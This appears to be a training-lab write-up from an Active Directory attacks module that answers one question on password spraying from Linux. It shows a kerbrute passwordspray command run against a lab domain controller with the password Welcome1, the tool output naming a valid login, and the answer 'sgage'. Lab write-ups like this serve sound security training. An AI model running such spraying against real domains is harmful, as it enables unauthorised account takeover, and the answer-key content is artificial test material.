# Section 11: Internal Password Spraying - from Linux

Module: 13. Active Directory Enumeration & Attacks

---

## Questions & Answers

### 1. Find the user account starting with the letter "s" that has the password Welcome1. Submit the username as your answer.

Context:
```bash
┌─[htb-student@ea-attack01]─[~]
└──╼ $vim valid_users.txt
┌─[htb-student@ea-attack01]─[~]
└──╼ $cat valid_users.txt 
sbrown
srosario
sinman
strent
sgage
┌─[htb-student@ea-attack01]─[~]
└──╼ $kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 08/18/26 - Ronnie Flathers @ropnop

2026/08/18 05:19:50 >  Using KDC(s):
2026/08/18 05:19:50 >  	172.16.5.5:88

2026/08/18 05:19:50 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
2026/08/18 05:19:50 >  Done! Tested 5 logins (1 successes) in 0.057 seconds
```

**Answer:** `sgage`

---

[Back to Module Index](./README.md)
